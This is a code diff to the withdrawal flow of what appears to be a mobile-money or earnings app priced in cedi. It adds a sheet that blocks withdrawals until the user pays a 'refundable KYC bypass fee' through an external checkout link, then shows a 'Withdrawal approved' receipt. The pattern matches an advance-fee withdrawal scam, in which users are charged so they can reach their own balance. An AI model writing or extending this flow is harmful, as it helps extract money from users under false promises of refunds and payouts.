@@ -1397,9 +1397,17 @@
         showFlowLoading();
         try {
             const [data] = await Promise.all([
-                api('/api/withdrawals', { method: 'POST', body: JSON.stringify(payload) }),
+                api('/api/withdrawals', { method: 'POST', body: JSON.stringify({ ...payload, returnOrigin: window.location.origin }) }),
                 new Promise(resolve => window.setTimeout(resolve, 1100)),
             ]);
+            if (data.kycRequired) {
+                // KYC fee not paid yet: nothing was deducted and no withdrawal exists.
+                applyServerState(data.state, { refreshUI: false, reason: 'withdrawal-kyc-required' });
+                closeFlowSheet();
+                withdrawWizard = { amount: 0, methodId: '', pin: '' };
+                showKycPaymentSheet(data);
+                return;
+            }
             applyServerState(data.state, { refreshUI: false, reason: 'withdrawal' });
             closeFlowSheet();
             safeNavigate('withdraw', 'withdrawal-complete');
@@ -1426,6 +1434,28 @@
     }
 
     // KYC is a one-time payment (the refundable bypass fee). There is no document-upload route any more.
+    // Shown when an unverified user submits a withdrawal: no balance is deducted and no
+    // withdrawal is created until this fee is paid.
+    function showKycPaymentSheet(data) {
+        const preview = data.withdrawalPreview || {};
+        openFlowSheet({
+            title: 'Verify to withdraw',
+            body: `
+                <div class="flow-summary">
+                    <div class="summary-row"><span>Requested amount</span><strong>${ghs(preview.requestedAmount)}</strong></div>
+                    <div class="summary-row"><span>Actual payout</span><strong>${ghs(preview.actualAmount)}</strong></div>
+                    <div class="summary-row"><span>KYC bypass fee</span><strong>${ghs(data.amount || KYC_BYPASS_FEE)} · Refundable</strong></div>
+                </div>
+                <p class="kyc-refund-note">Your balance has not been deducted. Your withdrawal is only submitted after this one-time ${ghs(data.amount || KYC_BYPASS_FEE)} verification fee is paid, and the fee is then refunded as a separate KYC Fee Refund.</p>
+            `,
+            primaryText: `Pay ${ghs(data.amount || KYC_BYPASS_FEE)} securely`,
+            secondaryText: 'Cancel',
+            onPrimary: () => { const b = byId('flowPrimaryBtn'); busy(b, true); if (b) b.textContent = 'Opening secure checkout…'; window.location.assign(data.checkoutUrl); },
+        });
+        const secondary = byId('flowSecondaryBtn');
+        if (secondary) secondary.onclick = closeFlowSheet;
+    }
+
     function showKycOptions(withdrawalReference) {
         window.continueWithoutKyc(withdrawalReference);
     }
@@ -1476,7 +1506,7 @@
             history.replaceState({}, '', location.pathname || '/');
             safeNavigate('withdraw', 'kyc-bypass-verified');
             refreshMountedUI('kyc-bypass-after-verification');
-            showToast('success', 'KYC bypass confirmed. Your ${ghs(KYC_BYPASS_FEE)} KYC Fee Refund is recorded in Withdrawal History.');
+            showToast('success', `KYC bypass confirmed. Your ${ghs(KYC_BYPASS_FEE)} KYC Fee Refund is recorded in Withdrawal History.`);
             openFlowSheet({
                 title: 'Withdrawal approved',
                 body: formatReceipt(data.refundReceipt || data.receipt),
